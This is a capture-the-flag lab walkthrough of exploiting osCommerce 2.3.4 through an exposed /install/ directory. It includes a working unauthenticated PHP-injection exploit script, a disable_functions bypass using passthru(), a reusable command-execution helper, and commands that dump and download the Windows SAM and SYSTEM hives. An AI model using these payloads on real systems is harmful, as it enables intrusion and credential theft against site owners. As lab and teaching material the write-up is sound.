# Blueprint — Walkthrough

Windows machine running a vulnerable osCommerce 2.3.4 installation, leading to unauthenticated RCE and SYSTEM access via an exposed `/install/` directory.

**Target:** `10.65.146.66`
**Attacker:** `192.168.142.214`

---

## Phase 1: Recon & Enumeration

```bash
sudo nmap -p- -sV 10.65.146.66 -vv
```

Port 8080 exposed an osCommerce 2.3.4 shop at `/oscommerce-2.3.4/catalog/`. The installation directory was still present and accessible — a critical misconfiguration:

```
http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/
```

---

## Phase 2: Exploitation — osCommerce RCE

osCommerce 2.3.4 is vulnerable to unauthenticated RCE when `/install/` isn't removed. Re-running `install.php?step=4` lets an attacker inject PHP into `includes/configure.php` via the `DB_DATABASE` POST parameter.

Base exploit used (`44374.py`, Simon Scannell / Exploit-DB):

```python
import requests

base_url = "http://10.65.146.66:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {'DIR_FS_DOCUMENT_ROOT': './'}
payload = '\');'
payload += 'system("ls");'
payload += '/*'
data['DB_DATABASE'] = payload

r = requests.post(url=target_url, data=data)
```

### Issue #1 — Unterminated comment

The original payload's trailing `/*` broke PHP (`Warning: Unterminated comment`). Fixed by switching to a single-line comment:

```python
payload += '//'   # instead of '/*'
```

### Issue #2 — `system()` disabled

Probed PHP config to find which functions were blocked:

```python
payload = '\');'
payload += 'echo "<pre>"; echo "disable_functions: " . @ini_get("disable_functions") . "\\n"; echo "</pre>";'
payload += '//'
```

Visiting `configure.php` returned `disable_functions: system` — only `system()` was blocked.

### Bypass confirmed with `passthru()`

```python
payload = '\');'
payload += 'passthru("whoami");'
payload += '//'
```

Result: `nt authority\system` — confirmed RCE as SYSTEM.

## Phase 3: Post-Exploitation — Command-by-Command RCE

A reverse shell attempt (Base64-encoded PowerShell TCP client delivered via `passthru()`) executed server-side but never connected back to the listener (`nc -lvnp 9001` showed no activity) — likely a VPN/routing/firewall issue rather than a payload issue, since `whoami` and other commands executed fine. Rather than debug that further, all post-exploitation was done via the same RCE primitive: inject a command, then visit `configure.php` to see its output.

Reusable helper:

```python
import requests

def run_cmd(cmd):
    target_url = "http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
    payload = '\');'
    payload += f'passthru("{cmd}");'
    payload += '//'
    data = {'DIR_FS_DOCUMENT_ROOT': './', 'DB_DATABASE': payload}
    requests.post(url=target_url, data=data)
    print("Visit: http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/includes/configure.php")

run_cmd("whoami")
```

No privilege escalation was needed — the initial exploit landed directly as SYSTEM.

### Dumping SAM / SYSTEM hives

```python
run_cmd("reg save hklm\\\\sam C:\\\\xampp\\\\htdocs\\\\oscommerce-2.3.4\\\\catalog\\\\install\\\\includes\\\\sam.save & reg save hklm\\\\system C:\\\\xampp\\\\htdocs\\\\oscommerce-2.3.4\\\\catalog\\\\install\\\\includes\\\\system.save")
```

Downloaded both hives directly via the web server:

```bash
wget http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/includes/sam.save
wget http://10.65.146.66:8080/oscommerce-2.3.4/catalog/install/includes/system.save
```


## Phase 5: Conclusion

Key takeaways:

- **Insecure installation defaults** — leaving `/install/` accessible is a critical, well-known misconfiguration.
- **Insufficient PHP hardening** — disabling only `system()` is ineffective while `passthru()`, `exec()`, `shell_exec()`, etc. remain enabled.
- **Attention to detail matters** — a single wrong comment style (`/*` vs `//`) or wrong wordlist can block an otherwise correct exploit chain.
- **RCE doesn't require a reverse shell** — when outbound connectivity is unreliable (VPN/firewall), command-by-command execution via the same injection point is a fully viable alternative for post-exploitation.

### Tools used

- `nmap` — initial discovery
- `python3` + `requests` — scripting the osCommerce RCE
- `nc` — reverse shell listener (attempted)
- Impacket (`secretsdump.py`) — hash extraction
- `hashcat` — password cracking
